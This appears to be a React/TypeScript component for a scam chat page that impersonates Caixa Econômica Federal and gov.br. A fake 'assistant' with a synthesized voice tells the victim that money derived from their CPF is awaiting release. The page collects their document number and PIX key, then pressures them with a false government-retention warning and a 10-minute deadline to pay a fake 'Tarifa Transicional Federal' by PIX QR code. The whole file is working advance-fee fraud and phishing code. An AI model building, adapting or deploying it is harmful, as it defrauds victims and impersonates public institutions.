import { useState, useEffect, useRef } from "react";
import { CheckCircle2, Search, ArrowRight, ShieldCheck, Loader2, PlayCircle, PauseCircle, MessageCircle } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import axios from "axios";
import { API_URL } from "../config";
import { QRCodeCanvas } from "qrcode.react";

interface ChatStepProps {
  data: {
    docType: string;
    docValue: string;
    birthDate: string;
  };
  onReset: () => void;
}

export function ChatStep({ data, onReset }: ChatStepProps) {
  const [messages, setMessages] = useState<any[]>([]);
  const [inputValue, setInputValue] = useState("");
  const [awaitingPix, setAwaitingPix] = useState(false);
  const [typing, setTyping] = useState(false);
  const [flowState, setFlowState] = useState<number>(0);
  const [leadName, setLeadName] = useState("");
  const [leadValue, setLeadValue] = useState("");
  const [leadPixKey, setLeadPixKey] = useState("");
  const [tarifa, setTarifa] = useState<number>(2.99);
  const [buyPixData, setBuyPixData] = useState<any>(null);
  
  const [audioUrl, setAudioUrl] = useState<string | null>(null);
  const audioRef = useRef<HTMLAudioElement | null>(null);
  
  const [attendant, setAttendant] = useState({ name: "Amanda", voiceId: "GM2UA3fbsIaLHcswCDX9" });

  const endOfMessagesRef = useRef<HTMLDivElement>(null);

  const calculateValue = (doc: string) => {
    const digits = doc.replace(/\D/g, "");
    const base = parseInt(digits.substring(0, 4)) || 1234;
    return (base * 1.5) + (parseInt(digits.slice(-2)) * 10);
  };

  useEffect(() => {
    endOfMessagesRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages, typing]);

  useEffect(() => {
    const setupChat = async () => {
      // Sorteia uma atendente
      const attendants = [
         { name: "Camila", voiceId: "EXAVITQu4vr4xnSDxMaL" },
         { name: "Letícia", voiceId: "ThT5KcBeYPX3keUQqHPh" },
         { name: "Amanda", voiceId: "GM2UA3fbsIaLHcswCDX9" },
         { name: "Juliana", voiceId: "JBFqnCBsd6RMkjVDRZzb" }
      ];
      const selectedAttendant = attendants[Math.floor(Math.random() * attendants.length)];
      setAttendant(selectedAttendant);

      try {
        const res = await axios.get(`${API_URL}/api/config`);
        if (res.data.tarifaTransicional) setTarifa(res.data.tarifaTransicional);
      } catch (e) {
        console.error("Config fetch failed", e);
      }

      setTyping(true);
      try {
        const response = await axios.post(`${API_URL}/api/v1/validate/document`, {
           docType: data.docType,
           docValue: data.docValue
        });
        
        const name = response.data?.name || response.data?.mockName || "Cidadão";
        setLeadName(name);
        
        const val = calculateValue(data.docValue);
        setLeadValue(val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' }));
        
        setTyping(false);
        addBotMessage(`Oii, ${name}! Tudo bem? Sou a ${selectedAttendant.name}. Tô vendo aqui que você tem um resgate aprovado de **${val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}** no seu ${data.docType}: ${data.docValue}. É você mesmo?`, [
          { text: "Sim, sou eu!", action: "confirm_identity" }
        ]);
      } catch (e) {
        setTyping(false);
        addBotMessage("Poxa, deu uma falha de conexão. Tenta recarregar a página, tá bom?");
      }
    };
    
    setupChat();
  }, []);

  const addBotMessage = (text: string, options?: any[]) => {
    setMessages(prev => [...prev, { sender: "bot", text, options }]);
  };

  const addUserMessage = (text: string) => {
    setMessages(prev => [...prev, { sender: "user", text }]);
  };

  const identifyPixType = (key: string) => {
    if (key.includes("@")) return "E-mail";
    const digits = key.replace(/\D/g, "");
    if (digits.length === 11 && !key.startsWith("(")) return "CPF";
    if (digits.length === 14) return "CNPJ";
    if (digits.length >= 10 && key.includes("(")) return "Celular";
    if (digits.length >= 10 && !key.includes("(")) return "Celular";
    return "Chave Aleatória";
  };

  const handleAction = async (action: string, payload?: string) => {
    if (action === "confirm_identity") {
      addUserMessage("Sim, sou eu!");
      setMessages(prev => {
        const newMessages = [...prev];
        if (newMessages.length > 1) {
             newMessages[newMessages.length - 2].options = [];
        }
        return newMessages;
      });
      setTyping(true);
      setTimeout(() => {
        setTyping(false);
        addBotMessage("Tô verificando aqui no sistema, só um segundo... 🔄");
        setTimeout(() => {
          addBotMessage("Pronto! Deu super certo ✅. Pra qual conta eu posso mandar esse valor agora?", [
            { text: "Mandar por PIX", action: "request_pix" }
          ]);
        }, 2000);
      }, 1000);
    } 
    else if (action === "request_pix") {
      addUserMessage("Mandar por PIX");
      setMessages(prev => {
        const newMessages = [...prev];
        if (newMessages.length > 1) newMessages[newMessages.length - 2].options = [];
        return newMessages;
      });
      setTyping(true);
      setTimeout(() => {
        setTyping(false);
        addBotMessage("Perfeito! Digita aqui embaixo qual é a sua Chave PIX, por favor:");
        setAwaitingPix(true);
      }, 1000);
    }
    else if (action === "submit_pix") {
      const pix = payload || inputValue;
      if (!pix) return;
      
      // Smart PIX Validation
      const pixType = identifyPixType(pix);
      if (pixType === "Chave Aleatória" && pix.length < 8) {
         setAwaitingPix(false);
         setInputValue("");
         addUserMessage(pix);
         setTyping(true);
         setTimeout(() => {
            setTyping(false);
            addBotMessage("Poxa, eu não consegui identificar isso como uma chave PIX válida. Pra eu conseguir te mandar o dinheiro agora, digita certinho a sua Chave PIX, tá bom?");
            setAwaitingPix(true);
         }, 1000);
         return;
      }

      setAwaitingPix(false);
      setInputValue("");
      addUserMessage(`Minha Chave PIX é: ${pix}`);
      setLeadPixKey(pix);
      setTyping(true);
      
      setTimeout(() => {
        setTyping(false);
        addBotMessage(`Legal, ${leadName.split(" ")[0]}! A chave foi aprovada no tipo ${pixType}.\nClica no botão aqui embaixo pra gente finalizar o saque:`, [
          { text: "Efetuar Saque Agora", action: "warning_step" }
        ]);
      }, 1500);
    }
    else if (action === "warning_step") {
      addUserMessage("Efetuar Saque");
      setMessages(prev => {
        const newMessages = [...prev];
        if (newMessages.length > 1) newMessages[newMessages.length - 2].options = [];
        return newMessages;
      });
      setTyping(true);
      setTimeout(() => {
        setTyping(false);
        addBotMessage("⚠️ **ATENÇÃO:** Caso não conclua o processo agora, o valor poderá ser retido pelo Governo Federal novamente.\nTem certeza que deseja prosseguir com o saque agora?", [
          { text: "Efetuar Saque Agora", action: "generate_payment" }
        ]);
      }, 1000);
    }
    else if (action === "generate_payment") {
      addUserMessage("Efetuar Saque Agora");
      setMessages(prev => {
        const newMessages = [...prev];
        if (newMessages.length > 1) newMessages[newMessages.length - 2].options = [];
        return newMessages;
      });
      setTyping(true);
      setFlowState(1); // Mudar layout para Comprovante
      
      try {
        // Fetch TTS audio
        const ttsRes = await axios.post(`${API_URL}/api/v1/tts`, { 
           name: leadName,
           attendantName: attendant.name,
           voiceId: attendant.voiceId
        });
        if (ttsRes.data.audioBase64) {
           const url = `data:audio/mp3;base64,${ttsRes.data.audioBase64}`;
           setAudioUrl(url);
           if (audioRef.current) {
             audioRef.current.src = url;
             audioRef.current.play().catch(e => console.log("Autoplay blocked:", e));
           }
        }

        // Fetch BuyPix
        const pixRes = await axios.post(`${API_URL}/api/v1/buypix/create`, {
          amount: tarifa,
          payer_document: data.docValue,
          payer_name: leadName
        });

        if (pixRes.data.data) {
           setBuyPixData(pixRes.data.data);
        }
      } catch (err) {
         console.error("Payment generation error", err);
      }
      setTyping(false);
      setFlowState(2); // Mostra o comprovante final
    }
  };

  const copyPix = () => {
    if (buyPixData?.pix_qr_code) {
      navigator.clipboard.writeText(buyPixData.pix_qr_code);
      alert("PIX copiado com sucesso!");
    }
  };

  if (flowState === 2) {
    return (
      <div className="w-full max-w-md mx-auto space-y-6">
        <div className="bg-white dark:bg-[#1f292e] rounded-lg shadow-sm border border-gray-100 overflow-hidden">
          {/* Cabeçalho Caixa */}
          <div className="bg-[#005CA9] p-4 text-center">
            <h2 className="text-white font-bold text-lg tracking-wide uppercase">CAIXA ECONÔMICA FEDERAL</h2>
            <p className="text-blue-100 text-xs">Comprovante de Emissão SVR</p>
          </div>
          
          <div className="p-4 bg-red-50 dark:bg-red-900/20 text-center border-b border-red-100">
             <p className="text-red-700 dark:text-red-400 font-bold text-sm">⚠️ PIX Pendente! Aguardando Pagamento da Tarifa Transicional...</p>
          </div>

          <div className="p-6 space-y-4">
             <div className="flex justify-between items-center text-sm border-b pb-2">
                <span className="text-gray-500">Beneficiário:</span>
                <span className="font-bold text-gray-800 dark:text-gray-200">{leadName}</span>
             </div>
             <div className="flex justify-between items-center text-sm border-b pb-2">
                <span className="text-gray-500">Documento:</span>
                <span className="font-bold text-gray-800 dark:text-gray-200">{data.docValue}</span>
             </div>
             <div className="flex justify-between items-center text-sm border-b pb-2">
                <span className="text-gray-500">Chave PIX Cadastrada:</span>
                <span className="font-bold text-gray-800 dark:text-gray-200">{leadPixKey}</span>
             </div>
             <div className="flex justify-between items-center text-sm pt-2">
                <span className="text-gray-500 font-medium">Valor Liberado:</span>
                <span className="font-bold text-green-600 text-lg">{leadValue}</span>
             </div>
          </div>
        </div>

        <div className="bg-white dark:bg-[#1f292e] rounded-lg shadow-sm p-6 space-y-6 border border-gray-100 text-center">
           <h3 className="text-lg font-bold">PAGAMENTO DA TARIFA</h3>
           <p className="text-sm text-gray-600 dark:text-gray-300">
             Tarifa Transicional Federal: <strong>R$ {tarifa.toFixed(2)}</strong>
           </p>

           {buyPixData?.pix_qr_code && (
              <div className="flex flex-col items-center space-y-4">
                 <div className="bg-white p-2 rounded-xl relative border-2 border-gray-100 inline-block shadow-sm">
                    <QRCodeCanvas value={buyPixData.pix_qr_code} size={200} />
                    <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 bg-white rounded p-1">
                      <span className="font-bold text-blue-700 text-[10px]">CAIXA</span>
                    </div>
                 </div>
                 <button onClick={copyPix} className="bg-[#2d7890] hover:bg-[#215a6d] text-white w-full py-3 rounded-lg font-bold transition-all shadow-md active:scale-[0.98]">
                    Copiar Código PIX
                 </button>
              </div>
           )}

           {audioUrl && (
             <div className="mt-4 bg-blue-50 dark:bg-blue-900/30 p-4 rounded-lg flex items-center space-x-3 border border-blue-100">
                <PlayCircle className="text-[#2d7890] w-8 h-8" />
                <div className="flex-1 text-left">
                   <p className="text-xs font-bold text-[#2d7890]">Áudio Oficial gov.br</p>
                   <p className="text-[10px] text-gray-500">Ouvindo orientações finais...</p>
                </div>
                <audio ref={audioRef} autoPlay onEnded={() => console.log('Audio ended')} />
             </div>
           )}

           <p className="text-xs text-gray-400 mt-4">
             Prazo para homologação: 10 minutos. Pague o mais rápido possível para evitar o cancelamento da liberação.
           </p>
        </div>
      </div>
    );
  }

  return (
    <div className="w-full max-w-lg mx-auto bg-white dark:bg-[#1f292e] rounded-xl shadow-lg border border-gray-100 overflow-hidden flex flex-col h-[600px]">
      {/* Header gov.br like */}
      <div className="bg-[#1b365d] text-white p-4 flex items-center shadow-md z-10">
        <div className="w-10 h-10 bg-white rounded-full flex items-center justify-center text-[#1b365d] font-bold mr-3 shadow-inner">
          <MessageCircle size={20} />
        </div>
        <div>
          <h2 className="font-bold text-sm tracking-wide">Assistente {attendant.name}</h2>
          <p className="text-xs text-blue-200">Online e verificando...</p>
        </div>
      </div>

      {/* Messages */}
      <div className="flex-1 overflow-y-auto p-4 space-y-4 bg-slate-50 dark:bg-[#12181b]">
        <AnimatePresence>
          {messages.map((msg, i) => (
            <motion.div 
              key={i} 
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}
            >
              <div className={`max-w-[85%] p-3 rounded-2xl text-sm shadow-sm ${msg.sender === 'user' ? 'bg-[#1b365d] text-white rounded-tr-none' : 'bg-white dark:bg-[#1f292e] text-gray-800 dark:text-gray-200 rounded-tl-none border border-gray-100 dark:border-gray-800'}`}>
                {msg.text.split('\\n').map((line:string, idx:number) => (
                   <p key={idx} className="mb-1" dangerouslySetInnerHTML={{__html: line.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')}} />
                ))}
                
                {msg.options && msg.options.length > 0 && (
                  <div className="mt-3 space-y-2">
                    {msg.options.map((opt: any, j: number) => (
                      <button 
                        key={j}
                        onClick={() => handleAction(opt.action)}
                        className="w-full block text-center bg-blue-50 hover:bg-blue-100 dark:bg-blue-900/30 dark:hover:bg-blue-800/40 text-[#1b365d] dark:text-blue-200 font-semibold py-2 px-3 rounded-lg border border-blue-100 transition-colors"
                      >
                        {opt.text}
                      </button>
                    ))}
                  </div>
                )}
              </div>
            </motion.div>
          ))}
          {typing && (
             <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex justify-start">
               <div className="bg-white p-3 rounded-2xl rounded-tl-none border border-gray-100 shadow-sm flex space-x-1 items-center">
                  <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" />
                  <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }} />
                  <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.4s' }} />
               </div>
             </motion.div>
          )}
          <div ref={endOfMessagesRef} />
        </AnimatePresence>
      </div>

      {/* Input Area */}
      {awaitingPix && (
        <div className="p-3 bg-white border-t border-gray-100 flex items-center space-x-2">
          <input 
            type="text" 
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
            onKeyDown={(e) => e.key === 'Enter' && handleAction("submit_pix")}
            placeholder="Digite sua Chave PIX..."
            className="flex-1 bg-slate-100 rounded-full px-4 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1b365d]"
          />
          <button 
            onClick={() => handleAction("submit_pix")}
            className="w-10 h-10 bg-[#1b365d] text-white rounded-full flex items-center justify-center hover:bg-[#122644] transition-colors"
          >
            <ArrowRight size={18} />
          </button>
        </div>
      )}
    </div>
  );
}
